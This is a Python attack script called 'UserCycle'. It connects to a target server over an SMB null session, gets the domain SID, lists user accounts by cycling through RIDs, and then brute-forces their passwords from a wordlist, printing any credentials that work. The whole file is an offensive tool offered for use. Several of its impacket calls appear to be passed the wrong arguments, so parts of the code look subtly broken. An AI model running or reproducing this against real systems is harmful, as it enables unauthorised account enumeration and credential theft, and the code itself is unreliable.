import argparse
import sys
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import lsat, samr
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket import nt_errors

def get_domain_sid(smb_client, server_name):
    """Retrieve the domain SID using LSA query."""
    try:
        lsa_pipe = lsat.hLsarOpenPolicy2(smb_client.getRemoteHost(), smb_client.getCredentials(), MAXIMUM_ALLOWED)
        sid = lsat.hLsarQueryInformationPolicy2(lsa_pipe, lsat.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)['PolicyPrimaryDomainInfo']['Sid']
        print(f"[*] Successfully enumerated base domain SID: {sid}")
        return sid
    except Exception as e:
        print(f"[!] Error retrieving domain SID: {e}")
        return None

def enumerate_users(smb_client, domain_sid, start_rid, end_rid):
    """Enumerate users by cycling through RIDs."""
    users = []
    try:
        samr_pipe = samr.hSamrConnect(smb_client.getRemoteHost(), smb_client.getCredentials())
        domain_handle = samr.hSamrOpenDomain(samr_pipe, domainSid=domain_sid)
        
        print(f"[*] Enumerating user accounts (RID {start_rid} to {end_rid})...")
        for rid in range(start_rid, end_rid + 1):
            try:
                user_handle = samr.hSamrOpenUser(domain_handle, userId=rid)
                user_info = samr.hSamrQueryInformationUser(user_handle, samr.USER_INFORMATION_CLASS.UserAccountInformation)
                username = user_info['UserAccountInfo']['AccountName']
                users.append((rid, username))
                print(f"[+] RID {rid}: {username}")
                samr.hSamrCloseHandle(user_handle)
            except Exception as e:
                if "STATUS_NO_SUCH_USER" in str(e):
                    continue
                print(f"[!] Error enumerating RID {rid}: {e}")
        
        samr.hSamrCloseHandle(domain_handle)
        samr.hSamrCloseHandle(samr_pipe)
    except Exception as e:
        print(f"[!] Error during enumeration: {e}")
    
    return users

def brute_force(smb_client, users, password_file):
    """Attempt to brute-force user accounts with passwords from a file."""
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Password file '{password_file}' not found.")
        return

    print("[*] Starting brute-force attack...")
    for rid, username in users:
        for password in passwords:
            try:
                smb_client.login(username, password)
                print(f"[+] Success! Username: {username}, Password: {password}")
                return  # Stop after first success for simplicity
            except Exception as e:
                print(f"[-] Failed login for {username} with {password}: {e}")
                continue

def main():
    parser = argparse.ArgumentParser(description="UserCycle: RID cycling attack for user enumeration")
    parser.add_argument('server_ip', help="Target server IP address")
    parser.add_argument('start_rid', type=int, help="Starting RID (e.g., 500)")
    parser.add_argument('end_rid', type=int, help="Ending RID (e.g., 50000)")
    parser.add_argument('--password-file', help="File containing passwords for brute-force")
    parser.add_argument('--output', help="File to save enumerated users")
    args = parser.parse_args()

    # Initialize SMB connection with null session
    try:
        smb_client = SMBConnection(args.server_ip, args.server_ip)
        smb_client.login('', '')  # Null session
    except Exception as e:
        print(f"[!] Failed to connect to {args.server_ip}: {e}")
        sys.exit(1)

    # Get domain SID
    domain_sid = get_domain_sid(smb_client, args.server_ip)
    if not domain_sid:
        print("[!] Cannot proceed without domain SID.")
        sys.exit(1)

    # Enumerate users
    users = enumerate_users(smb_client, domain_sid, args.start_rid, args.end_rid)

    # Save to output file if specified
    if args.output and users:
        try:
            with open(args.output, 'w', encoding='utf-8') as f:
                for rid, username in users:
                    f.write(f"RID {rid}: {username}\n")
            print(f"[*] Results saved to {args.output}")
        except Exception as e:
            print(f"[!] Error saving to {args.output}: {e}")

    # Brute-force if password file is provided
    if args.password_file and users:
        brute_force(smb_client, users, args.password_file)

    smb_client.close()

if __name__ == "__main__":
    main()